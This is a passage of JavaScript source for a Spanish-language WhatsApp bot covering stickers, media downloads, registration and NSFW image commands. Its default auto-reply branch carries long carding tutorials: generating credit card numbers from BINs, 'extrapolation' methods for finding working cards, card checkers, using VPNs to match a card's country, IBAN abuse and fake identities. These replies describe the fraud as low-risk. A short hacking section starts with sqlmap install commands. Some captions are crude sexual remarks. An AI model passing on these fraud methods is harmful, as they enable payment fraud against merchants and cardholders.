							.save(ran)
						} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						reply(mess.only.pegatina)
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`[❗] Fallo, al momento de convertir la imagen a sticker`)
							})
							.on('end', function () {
								console.log('Finish')
							        exec(`webpmux -set exif ${addMetadata(pack, author)} ${ran} -o ${ran}`, async (error) => {
									if (error) {
											 fs.unlinkSync(media)	
											 fs.unlinkSync(ran)
											 }
								buff = fs.readFileSync(ran)
								client.sendMessage(from, buff, sticker)
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
						})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
						}
						break
					
					case 'attp':
						if (!isUser) return reply(mess.only.daftarB)
					        if (args.length < 1) return reply(`¿Dónde está el texto?\n*Ejemplo:* ${prefix}attp shanduy`)
						reply(mess.only.attp)
					        attp2 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${body.slice(6)}`)
						client.sendMessage(from, attp2, MessageType.sticker, {quoted: mek})
						break
					
			          case 'qrcode':
                buff = await getBuffer(`https://api.qrserver.com/v1/create-qr-code/?data=${body.slice(8)}&size=1080%C3%971080`)
				client.sendMessage(from, buff, image, {quoted: mek})
				break  
				
				case 'toimg':
				    client.updatePresence(from, Presence.composing)
                                    if (!isUser) return reply(mess.only.daftarB)
					if (!isQuotedSticker) return reply('❌ Solo stickers')
					reply(mess.only.imgs)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('❌ No se pudo convertir el sticker en imágenes')
						buffer = fs.readFileSync(ran)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: '*⌈ Imagen convertida ✅ ⌉*\n\n_*by shanduy*_'})
						fs.unlinkSync(ran)
					})
					break
					/*
                        case 'tomp3':
                	client.updatePresence(from, Presence.composing) 
                        if (!isUser) return reply(mess.only.daftarB)
					if (!isQuotedVideo) return reply('Responde al video con el comando *tomp3')
					reply(mess.only.mpcancion)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('❌ No se pudo convertir el video a mp3')
						buffer = fs.readFileSync(ran)
						client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek})
						fs.unlinkSync(ran)
					})
					break
					*/
//CREACION DE STICKERS Y VARIOS	            
		
	//SERVICIO DE MUSICA Y VIDEO 			
				
		/*		
	        case 'play':   
	        if (args.length < 1) return reply('Donde esta el nombre de la canción?\n\nEjemplo: *play Industry Baby - Lil Nas X')
		if (!isUser) return reply(mess.only.daftarB)
                reply(mess.only.musica)
                play = body.slice(5)
                anu = await fetchJson(`https://api.zeks.me/api/ytplaymp3?q=${play}&apikey=23hamilton`)
                if (anu.error) return reply(anu.error)
                infomp3 = `*⌜Cancion Encontrada ✅⌟*\n◉ *Título:* ${anu.result.title}\n◉ *Fuente:* ${anu.result.source}\n◉ *Tamaño:* ${anu.result.size}\n\n*ESPERE ENVIANDO SU ARCHIVO MP3 ⚠*\n\n_*Servicio proveido por shanduy*_`
                buffer = await getBuffer(anu.result.thumbnail)
                lagu = await getBuffer(anu.result.url_audio)
                client.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
                client.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: mek})
                break
		
		case 'play2':   
	        if (args.length < 1) return reply('Donde esta el nombre de la canción?\n\nEjemplo: *play2 Industry Baby - Lil Nas X')
		if (!isUser) return reply(mess.only.daftarB)
	        reply(mess.only.musica2)
                play = body.slice(5)
                anu = await fetchJson(`https://api.zeks.me/api/ytplaymp3?q=${play}&apikey=23shanduy`)
                if (anu.error) return reply(anu.error)
                infomp3 = `*⌜Cancion Encontrada ✅⌟*\n◉ *Título:* ${anu.result.title}\n◉ *Fuente:* ${anu.result.source}\n◉ *Tamaño:* ${anu.result.size}\n\n*ESPERE ENVIANDO SU ARCHIVO MP3 ⚠*\n\n_*Servicio proveido por shanduy*_`
                buffer = await getBuffer(anu.result.thumbnail)
                lagu = await getBuffer(anu.result.url_audio)
                client.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
                client.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: mek})
                break
                                
		case 'ytmp4':
		if (args.length < 1) return reply('Donde esta la url del video?\n\nEjemplo: *ytmp4 www.youtube.com/xxxxxxxxx')
		if (!isUser) return reply(mess.only.daftarB)
		reply(mess.only.mpv)
		if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
		anu = await fetchJson(`https://api.zeks.me/api/ytmp4?apikey=${apikey}&url=${args[0]}`, {method: 'get'})
		if (anu.error) return reply(anu.error.yt)
		teks = `*⌜Video Encontrado ✅⌟*\n◉ *Título:* ${anu.result.title} \n◉ *Tamaño:* ${anu.result.size}\n\n*ESPERE ENVIANDO SU ARCHIVO MP4 ⚠*\n\n_*Servicio proveido por shanduy*_`
		lagu = await getBuffer(anu.result.thumbnail)
                client.sendMessage(from, lagu, image, {quoted: mek, caption: teks})
		buffer = await getBuffer(anu.result.url_video)
		client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.result.title}.mp4`, quoted: mek})
		break
				
                case 'fa':
                if (args.length < 1) return reply('Donde esta el link de facebook?')
                if(!isUrl(args[0]) && !args[0].includes('facebook')) return reply(mess.error.Fb)
                teks = args.join(' ')
                reply(mess.only.insta)
                res = await fbDown(teks).catch(e => {
                  reply(mess.only.insta)
                })
                a = res[0]
                result = `*⌜Post Encontrado ✅⌟*\n◉*Titulo:* ${a.judul} \n◉ *Fuente:* ${a.source} \n◉ *Tamaño:* ${a.size} \n◉ *Calidad:* ${a.quality} \n◉ *Tipo:* ${a.type} \n◉ *Nombre del archivo:* ${a.judul}.${a.type}\n\n*ESPERE ENVIANDO SU POST ⚠*\n\n_*Servicio proveido por shanduy*_`
                sendFileFromUrl(a.thumb, image, {caption: result, quoted: sam})
                sendFileFromUrl(a.link, video, { mimetype: 'video/mp4',quoted: sam, filename: `${a.judul}.${a.type}`})
                break
		*/
														
	//FIN DE SERVICIO DE MUSICA Y VIDEO			
				
//REGISTRO				

case 'daftar':
client.updatePresence(from, Presence.composing)
if (isUser) return reply('Ya estas registrado 🧐')
if (args.length < 1) return reply(`Incorrecto ❎\nComando: ${prefix}daftar Nombre\n\nEjemplo: ${prefix}daftar Joseph`)
var reg = body.slice(8)
var nombre = reg.split("|")[0];
user.push(sender)
fs.writeFileSync('./database/json/user.json', JSON.stringify(user))
client.sendMessage(from, `\`\`\`REGISTRADO ✅\`\`\`\n\n\`\`\`Clan: Namikaze\`\`\`\n\n\`\`\`Hora Latam: ${time}\`\`\`\n\n\`\`\`Fecha: ${date}\`\`\`\n\n\`\`\`[Usuario]: ${nombre}\`\`\`\n\`\`\`[Número]: wa.me/${sender.split("@")[0]}\`\`\`\n\n\`\`\`Para usar el bot\`\`\`\n\`\`\`Por favor\`\`\`\n\`\`\`enviar ${prefix}help\`\`\`\n\`\`\`\nTotal de usuários: ${user.length}\`\`\``, text, {quoted: mek})
break
                                
//FIN DE REGISTRO  
				
				case 'nsfwneko':
				    try{
						if (!isNsfw) return reply('❌ *NSFW NO ESTA ACTIVADO* ❌')
                                                if (!isUser) return reply(mess.only.daftarB)
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwneko?apikey=BotWeA`, {method: 'get'})
						buffer = await getBuffer(res.result)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'mesum'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ *ERROR* ❌')
					}
					break
                              	case 'nsfw':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Digita 1 para activar los NSFW')
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply('Recursos Activados ✅')
						nsfw.push(from)
						fs.writeFileSync('./database/json/nsfw.json', JSON.stringify(nsfw))
						reply('❬ ✅ ❭ La funcion NSFW esta habilitado en este grupo')
					} else if (Number(args[0]) === 0) {
						nsfw.splice(from, 1)
						fs.writeFileSync('./database/json/nsfw.json', JSON.stringify(nsfw))
						reply('❬ ✅ ❭ La funcion NSFW esta deshabilitado en este grupo')
					} else {
						reply('Digite 1 para activarlo, 0 para desactivarlo')
					}
					break	
				case 'waifu':
					gatauda = body.slice(7)
					reply(mess.wait)
                                        if (!isUser) return reply(mess.only.daftarB)
					anu = await fetchJson(`https://arugaz.my.id/api/nekonime`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image,{quoted: mek})
					break
				case 'randomanime':
					gatauda = body.slice(13)
					reply(mess.wait)
                                        if (!isUser) return reply(mess.only.daftarB)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomanime?apikey=BotWeA`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break						
                             case 'delete':
					case 'del':
					if (!isGroup)return reply(mess.only.group)
                                        if (!isUser) return reply(mess.only.daftarB)
		                        client.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
                 case 'level':
                if (!isLevelingOn) return reply(mess.levelnoton)
                if (!isGroup) return reply(mess.only.group)
                const userLevel = getLevelingLevel(sender)
                const userXp = getLevelingXp(sender)
		sem = sender.replace('@s.whatsapp.net','')
		if (userLevel === undefined && userXp === undefined) return reply(mess.levelnol)
                resul = `『 *TUS ESTADISTICAS 🆙* 』\n\nTus estadisticas en tiempo real 🕐\n\n├─ ❏ *NOMBRE:* ${sem}\n├─ ❏ *XP 🆙:* ${userXp}\n└─ ❏ *NIVEL:* ${userLevel}`
               client.sendMessage(from, resul, text, { quoted: mek})
                .catch(async (err) => {
                        console.error(err)
                        await reply(`Error!\n${err}`)
                    })
            break
				
            case 'leveling':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (args.length < 1) return reply('Digita *leveling 1 para activar este recurso')
                if (args[0] === '1') {
                    if (isLevelingOn) return reply('*La función de nivel ya estaba activa*')
                    _leveling.push(groupId)
                    fs.writeFileSync('./database/json/leveling.json', JSON.stringify(_leveling))
                     reply(mess.levelon)
                } else if (args[0] === '0') {
                    _leveling.splice(groupId, 1)
                    fs.writeFileSync('./database/json/leveling.json', JSON.stringify(_leveling))
                     reply(mess.leveloff)
                } else {
                    reply(` *Digita el comando 1 para activar, 0 para desactivar *\n * Ejemplo: ${prefix}leveling 1*`)
                }
            break
                               
					case 'nsfwbobs': 
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://meme-api.herokuapp.com/gimme/biganimetiddies`, {method: 'get'})
							buffer = await getBuffer(res.url)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Quiero ver tetas'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
						break
					
				
					case 'nsfwsidebobs':
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://meme-api.herokuapp.com/gimme/sideoppai`, {method: 'get'})
							buffer = await getBuffer(res.url)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'La vieja de gabo, tremenda puta'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
					    break
					
					case 'nsfwahegao':
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://meme-api.herokuapp.com/gimme/ahegao`, {method: 'get'})
							buffer = await getBuffer(res.url)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Joder, quisiera follarmela'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
						break
					
					case 'nsfwfeets':
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://meme-api.herokuapp.com/gimme/animefeets`, {method: 'get'})
							buffer = await getBuffer(res.url)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'MMMMM PATAS'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌') 
						}
						break
				
						
                                case 'ping':    
			   	        if (!isUser) return reply(mess.only.userB)
                                        const timestamp = speed();
                                        const latensi = speed() - timestamp
                                        client.updatePresence(from, Presence.composing) 
				        uptime = process.uptime()
                                        client.sendMessage(from, `Velocidad: *${latensi.toFixed(4)} _Second_*\nDevice: *Alcatel Pixi 4*\nRAM: *6Mb*\nData: *10GB*\nRed: *2G*\nEstado: *Bateria Baja*`, text, { quoted: mek})
                                        break
                                case 'ttp':
					if (args.length < 1) return reply('Y el texto flaco?')
					ranp = getRandom('.png')
					rano = getRandom('.webp')
					teks = body.slice(4).trim()
					anu = await fetchJson(`https://mhankbarbar.tech/api/text2image?text=${teks}&apiKey=${BarBarKey}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(mess.error.stick)
						client.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					break
                default:
		// INICIO AUTORESPUESTA - BINNING
		if (budy.includes(`/que es un bin`)) {
                  reply(`PARA LOS QUE NO SABEN HACER CUENTAS....ESTE ES UN TUTORIAL TEÓRICO PARA QUE SEPAN A LO QUE SE ESTAN METIENDO.

✅ ¿QUE ES UN BIN?

BIN: Bank Identification Number.

Un bin son los primeros 6 dígitos de una tarjeta de crédito. Estos nos sirven para identificar el país de procedencia, tipo de tarjeta y nivel de la misma.

Ejemplo: 553667

✅ ¿PARA QUE SIRVEN?

Con el bin puedes crear ccs (credit card) en español (tarjeta de crédito).Al generar la cc a base de bin puedes hacer suscripciones en páginas y hasta en ocasiones compras físicas. 

✅ ¿QUE ES UNA CC?

(CC=TARJETA DE CREDITO)

Primero debemos tener claro que una CC no es un BIN, una CC esta compuesta por información real.
Las CCs basicamente se componen por:

°Nombre
°Numero de la tarjeta
°CCV
°Fecha
°Dirección
°Código postal
°Pais
°Algunas traen numero telefónico y/o correo.

✅ ¿COMO RECONOCER EL TIPO DE TARJETA?

Pues Fácil. Observa:

La tarjeta comienza con el número 4 [Visa]

La tarjeta comienza con el número 5 [MasterCard]

La tarjeta comienza con el número 3 [Amex]

La tarjeta comienza con el número 6
[Discovey]

✅ ¿COMO CREAR UN BIN?

Un bin se hace a base de una cc real, solo debemos copiar los 6 primeros números de la cc y agregamos 10 equis (x)

Ejemplo: 4567812364745823

Bin: 456781xxxxxxxxxxx

Haciendo eso te pones a calar en páginas obvio con la misma ip de
la cc de la cual salió el bin.

✅ ¿EN QUE PAGINAS JALAN?

Bueno, esto es depende de donde sea el bin. Hay bins que jalan en una sola pagina ejemplo (crunchyroll) y hay otros que son multifuncionales ejemplo (crunchyroll, mubi, Napster y entre otras).

Posdata: solo tome esas páginas para el ejemplo.

✅ ¿COMO GENERAR UNA CC CON UN BIN?

existen varios generadores de ccs
que se encargan de remplazar las “x” por números que coincidan
con una cc.

El generador que yo usaré será Namso (https://namso-gen.com/)

INSERTE SU BIN: 548572xxxxxxxxxx

Y señalamos Fecha & CCV2 (si es todo generado)

Cantidad a crear 10 o las que quieran

Y le damos generar tarjetas.

✅ ¿QUE ES CHAVELO?

Se le denomina “Chabelo” a un bin que pese a que es viejo sigue funcionando en varias páginas.

✅ ¿Corremos riesgo al utilizar un bin?

Los BINS no son tan peligrosos, con la acción de “binear”, solo se estafa a la empresa en donde la usaste la cc generada.

Las tarjetas no son de dueños reales, solo son algoritmos, que de alguna manera pasan en una
página.

Lo más malo que te puede pasar, es que una página bloquee tu IP real permanentemente o tu dispositivo.

La otra cosa, es que tu IP puede estar en una lista negra de SPAM, eso es
provocado usualmente por VPN’s como Hola que vende este tipo de datos de sus usuarios a otras compañías, lo cual es algo que Hola no te especifica. Igual, hay muchos mejores VPN’s .

Es muy raro que pase, binear no es peligroso, si es que no abusas o llegas a un extremo muy pero muy elevado.

✅ ¿Qué es BAN?

Seguramente en los diversos grupos has escuchado esto, literalmente Ban significa prohibir esto es que se te pone una restricción; ya sea total, parcial, temporal o permanente, al sitio en donde has realizado la compra.

✅ ¿QUE ES UN VPN?

Una red privada virtual (RPV).
En inglés: Virtual Private Network (VPN), en pocas palabras VPN es algo que ayuda a que tu verdadera direccion IP quede cubierta, por ejemplo si tu eres de Argentina y un bin pide IP de Rusia, deberemos descargar un VPN como Tunnelbear para cambiar nuestra direccion a alli, los VPNs son faciles de usar y son una parte fundamental para usar bins, sin ellos no podremos usar la mayoria de ellos.
Existen varios vpns algunos son de paga, y otros gratuitos como Vyprvpn y tunnelbear entre otros. ZeroVPN, VyprVPN, TunnelBear, Hotspot Shield, HMA.

✅ ¿QUE ES IP?

IP = Internet Protocol, o simplemente tu dirección de Internet, todos nuestros dispositivos
conectados a internet poseen uno otorgado gracias a la red a la que estamos conectados. La IP en
algunos casos puede señalar la locación exacta en la que estamos ubicados.

✅ ¿QUE SON LIVES?
Las lives son tarjetas de crédito aprobadas por el mercado, es decir, tienen fondos. Estás sirven para hacer el pago con más seguridad.

✅ ¿QUE ES EXTRAPOLACIÓN?
Extrapolar es cuando sacamos un bin a partir de una tarjeta de credito existente, por ejemplo:

3764010x5xxx03x
37640101x526xxx
3764010xx5x6xx7
3764010xxx2xxx7

✅ ¿CÓMO EXTRAPOLAR UNA ‘CC’ GENERADA A PARTIR DE UN BIN?

Esto sirve para que vuelva a funcionar la tarjeta generada que utilizaste, es muy importante que la guardes, para que le vuelvas a dar una utilidad y disfrutar de ella. Tienes un bin, por ejemplo: 531321xxxxxxxxxx (Deezer Jalando), y con base a éste, generas un par de tarjetas. A partir de que generas dejan de llamarse bins y pasan a ser
tarjetas de crédito. Escoges una al azar por ejemplo: 5321321654829183

Te vas a la pagina de deezer y al registrar dicha tarjeta que hayas escogido, pasa al primer intento para crearla, pero después de un tiempo no funciona el bin.

Lo que haremos será extrapolar la tarjeta que pasó a la primera al crear la cuenta.

Lo haremos (extrapolar), eliminando los últimos 6 digitos de la tarjeta, Ejemplo: teníamos esta: 5321321654829183 y ahora pasa a ser esto:

5313216568xxxxxx

Generas de nuevo para calar en deezer y ya esta, volvió a pasar.`)
                  }

		if (budy.includes(`/extrapolar un bin`)) {
                  reply(`⚜ ¿QUE ES EXTRAPOLACIÓN? ⚜

Extrapolar es cuando sacamos un bin a partir de una tarjeta de credito existente, Por Ejemplo:

3764010x5xxx03x
37640101x526xxx
3764010xx5x6xx7
3764010xxx2xxxxx

Hay 3 métodos de extrapolación: básica,  y avanzada.

🔰 𝗕𝗔𝗦𝗜𝗖𝗔:

Consiste en 2 tipos de extrapolación:

Similitud. 
Activación.

✅ ACTIVACIÓN

Simplemente tomas una tarjeta Generada con tu bin carbon y cambias los ultimos 6 digitos por la letra 𝘅

Ejemplo:

Tarjeta Usada: 5292202302315781

Resultado: 5292202302xxxxxx 

✅ SIMILITUD

Requiere tener 2 CC del mismo BIN, que son:
 
T1: 5292203820803126
T2: 5292207483033368

Debemos separar los 6 primeros números de la CC:

[529220] [3820803126]
[529220] [7483033368]

Y, se van a fijar en el segundo grupo:

[3820803126] y [7483033368]

Después, van a comprobar SIMILITUDES entre estos dos, es decir, vas al segundo grupo que se separó:
 
[3820803126]
[7483033368]

Ordenarlas de este modo, y después, comparar.Si tienen el mismo número, se quedan iguales, si no, se reemplazan por una X, es decir:

T1: [3820803126]
T2: [7483033368]

Quedaria asi: [xxxxxx3xxx]

Ahora, juntas el bin con tu resultado: 

New Bin: 529220xxxxxx3xxx

Y ese es tu nuevo bin extrapolado

🔰 𝗔𝗩𝗔𝗡𝗭𝗔𝗗𝗔:

Esta es una compleja, pero muy buena para generar lives.
Muy poca gente la conoce, ya que esta fue extraída de el software de generación de tarjeta SoFlA de un banco b10*sum:

T1: 5292208177212441 
T2: 5292204657663815 

Para este método, debemos usar únicamente los 10 dígitos de dos CCs. 
Pero, como hago si las CCs tienen diferentes números? 
Bueno. Del tercer grupo, solo se usarán los 2 números de la tarjeta.

5292 2081 x72x xxxx 
5292 2081 x76x xxxx

Se suman

7+2= 09 
7+6= 13
 
A partir de estos resultado, se divide el número entre 2: 

7+2= 09÷2=4.5 
7+6= 13÷2=7.5 

Después, se multiplica por 5. 

7+2= 09÷2=4.5=22.5 
7+6= 13÷2=7.5 =37.5 

Si existe un decimal (.) y el número es de dos cifras, se borra el decimal. 

Y el resultado se suma: 

22+37 =59 

Así que terminaria:
 
5292 2081 59xx xxxx

✅ INDENTACION LOGICA:

5292208177212441
 
Debemos separar los 6 primeros números de la CC:

[ 529220] [8177212441]

Y, se van a fijar en el segundo grupo

[8177212441]

Después, este grupo lo deben separar en modo (3-4-3), es decir: 

[817] [7212] [441]

Y, eliminan el número central: 

[8x7] [7xx2 [4x1] 

Después, ordenan el BIN con el resto: 

Resultado Final: 5292208x77xx24x1

✅ MATERIALDINVERTER

Este es algoritmo privado el cual afecta a las tarjetas generadas después de mediados del 2017, fue tomado del software SoFlA del Banco de Bogotá. 

Este es el mas, mas complejo de todos y tiene un 100% de seguridad de sacar lives si lo usas bien. 

Este método requiere 2 CCs, las cuales comúnmente son expedidas entre Octubre 2016 a Febrero 2017. 
Así que:

T1: 5292208177212441 
T2: 5292204657663815

Tienes que separar T1 y T2 en 2 grupos de 8 digitos 

T1:[52922081 [77212441 
T2:[52922046 [57663815 

Ahora, vas a agarrar T2 y vas a ordenarlo del siguiente orden para poder multiplicarlo 
5×5= 25 
2×7= 14 
9×6= 54 
2×6= 12 
2×3= 6 
0×8= 0 
4×1= 4 
6×5= 30 

Vas a escribir cada resultado en una línea pegado: 
2514541260430

Como pueden ver, hay 13 números, debemos hacer que sean 8, así que borramos los últimos 

5 para que nos queden 8 que serían: 

Nos queda: 25145412 

Ahora, vamos a pegar el primer grupo con nuestro resultado: 

=5292204625145412 

Ahora, vamos a realizar extrapolación basica, similitud entre T1 y el resultado, por eso, separamos: 

T1: 5292208177212441 

R1: 5292204625145412 

Nuestro resultado seria: 529220xxxxxxx4xx 

Ahora, si el último dígito termina siendo una X, este se reemplaza por 1 

El resultado final sería: 529220xxxxxxx4x1`)
                  }
					
		if (budy.includes(`/verificar un bin`)) {
                  reply(`Bueno geys. En esta oportunidad les enseñare a Verificar su BIN
Primero necesitaremos un BIN. La ves pasada les enseñe como sacarlo xd.

Para ahorrar toda esa clase usaremos al bot del grupo, bueno una ves obtenido el BIN ( 410453 ). 

Luego nos dirigimos a https://www.bincodes.com/bin-checker/

Una ves abierta la pagina. Buscamos el apartado Bank Identification o en español ( Número De Identificación ).Y ahi colocaremos nuestro BIN ( 410453 )

Ahora tendremos que validar,completar el Captcha.

Una ves hecho esto, damos clic en la opción CHEQUE.

Esperamos unos minutos y nos saldra la información de nuestro BIN.

Resultado de la validación de BIN

410453 es un BIN válido.

Detalles del BIN

COMPARTIMIENTO: 410453

Banco emisor: KEMBA CREDIT UNION, INC.

Marca de carro: VISA

Tipo de tarjeta: CRÉDITO

Nivel de tarjeta: CLÁSICO

Nombre de país: ESTADOS UNIDOS

BY: @JOSEPHBINERO`)
                  }

		if (budy.includes(`/que es live`)) {
                  reply(`-Una live es una Cc que será aprobada en el lugar de donde es el bin

Una live igual es una cc que tiene fondos.

¿Cómo sacar una live?

Las Lives se pueden sacar de diferentes maneras

1- Una live se puede sacar desde un bot de Telegram ya sea gratuito o de paga, esos son los checkers spam [Anti Spam]

2- Otra forma de sacar una Live es comprando un checker web, esos son checkers que no tienen [Anti Spam] y puedes cargar varias ccs sin necesidad de esperar un molesto [Anti Spam]

¿Qué es un checker y cuanto valen?

-Un checker es un sistema el cual se encarga de verificar que una cc está live

-El precio de un checker varía de cada dueño del checker

¿Qué es un Gate? Un Gate es un lugar especifico para meter una cc, existen varios tipos de Gate como:

-Multigata

-CVV gate

-CCN GATE

¿Qué es CCN Y CVV?

-Una CCN es una cc que tiene correcto los 16 dígitos y la fecha correcta pero el código de seguridad es incorrecta

-Una CVV es una cc que tiene todo correcto

¿Para qué sirve una CVV?

La CVV sirve para hacer compras físicas u comprar algún servicio sin riesgo a que el mismo se caiga a las semanas o días.`)
                  }
	if (budy.includes(`/iban`)) {
                  reply(`⚠️| Método Iban.

Bueno chicos hoy les voy a enseñar un metodo sencillo que puede sacarlos de un apuro, se llama Iban o Sepa...

¿Y que es esto?

El International Bank Account Number "Código Internacional de Cuenta Bancaria" en su traducción al español, es un código alfanumérico que identifica una cuenta bancaria determinada en una entidad financiera en cualquier lugar del mundo. 
Es decir, a cada cuenta le corresponde un único IBAN mediante el cual se identifica el país, la entidad, la oficina y la cuenta. 
Se trata de un estándar del Comité Europeo de Estándares Bancarios, que a su vez cumple con el estándar ISO 13616.

A continuación les mostrare una lista de países que usan este metodo (esta actualizada así que aprecienlo)

Caracteres Albania [🇦🇱]~[28]: AL35202111090000000001234567     
  Caracteres Andorra [🇦🇩]~[24] AD1400080001001234567890  
Caracteres Azerbaiyán [🇦🇿]~[28] AZ96AZEJ00000000001234567890         
 Caracteres Bahréin [🇧🇭]~[22] BH02CITI00001077181611  
Caracteres Bélgica [🇧🇪]~[16]
BE71096123456769  
Caracteres Bosnia [🇧🇦]~[20]: BA275680000123456789 
Caracteres Brasil [🇧🇷]~[29]: BR1500000000000010932840814P2          
 Caracteres Bulgaria [🇧🇬]~[22]:
BG18RZBB91550123456789 
Caracteres Costa Rica [🇨🇷]~[22] CR37012600000123456789  
Caracteres Dinamarca [🇩🇰]~[18]: DK9520000123456789 
Caracteres Alemania [🇩🇪]~[22]: DE91100000000123456789  
Caracteres Salvador [🇸🇻]~[28]:
SV43ACAT00000000000000123123     
 Caracteres Estonia [🇪🇪]~[20]:
EE471000001020145685    
Caracteres Finlandia [🇦🇽]~[18]:
FI1410093000123458  
Caracteres Francia [🇨🇵]~[27]: FR7630006000011234567890189   
  Caracteres Georgia [🇬🇪]~[22]:
GE60NB0000000123456789   
Caracteres Polonia [🇵🇱]~[28]:
PL10105000997603123456789123  
  Caracteres Portugal [🇵🇹]~[25]:
PT50002700000001234567833  
Caracteres Rumania [🇲🇩]~[24]:
RO09BCYP0000001234567890  
Caracteres Suiza [🇨🇭]~[21]:
CH5604835012345678009 
Caracteres Serbia [🇷🇸]~[22]
RS35105008123123123173    
Caracteres Eslovenia [🇸🇮]~[19] SI56192001234567892`)
                  }
					
		if (budy.includes(`/iban`)) {
                  reply(`⚠️| Método Iban Parte ²

~Basicamente esa es la teoría de que es Iban 😛.

¿Para que funciona?

•Se utiliza como metodo alternativo al Bin, ya que puede que funcione de diferente manera en paginas destinadas a otros servicios como es el caso mas común con Napster.
 Su uso puede varias, ya es cuestión de ustedes Intentar.

Iba a utilizar Napster para enseñarles, pero Alemania fue baneada de sus servidores así que no funciona Pero no se preocupen cualquier pagina con un dominio Aleman o de los países anteriormente mostrados servira.

¿Que necesitamos para este metodo?

[✓] VPN activado en Alemania (puede que funcione cualquier VPN pero recomiendo uno como HMA).

[✓] Entrar en la página fake-it.ws y seleccionar la Bandera de Alemania.

[✓]  Intentar en sitios que acepten este tipo de pago. 

[1️⃣] En primer lugar con nuestro VPN Activado, ingresamos a fake-it.ws

[⚠️] Chicos las identidades falsas son clave en este mundo. 

[⚠️]Algunas paginas piden minimo algo de relación entre nombre y vivienda

[⚠️] Incluso numero de celular, que aunque no lo verifiquen puede llegar a molestar buscarlo.

[✓] Así que usen fake-it.ws

[✓] La interfaz de la pagina es bastante intuitiva,fácil de entender y usarla.`)
                  }
		// FINAL AUTORESPUESTA - BINNING
					
                // INICIO AUTORESPUESTA - HACKING
		if (budy.includes(`/sqlmap`)) {
                  reply(`💉Sqlmap es una herramienta de prueba de penetración de código abierto que automatiza el proceso de detección y explotación Defectos de inyección SQL y apoderamiento de servidores de bases de datos. Viene con un potente motor de detección, muchas funciones de nicho. para el mejor probador de penetración y una amplia gama de cambios que duran desde la toma de huellas digitales de la base de datos, hasta la obtención de datos de la base de datos, para acceder al sistema de archivos subyacente y ejecutar comandos en el sistema operativo a través de conexiones fuera de banda..💉

🔒Installation:📲

$ apt update && apt upgrade
$ apt install git 
$ apt install python2
$ apt install python
$ git clone https://github.com/sqlmapproject/sqlmap
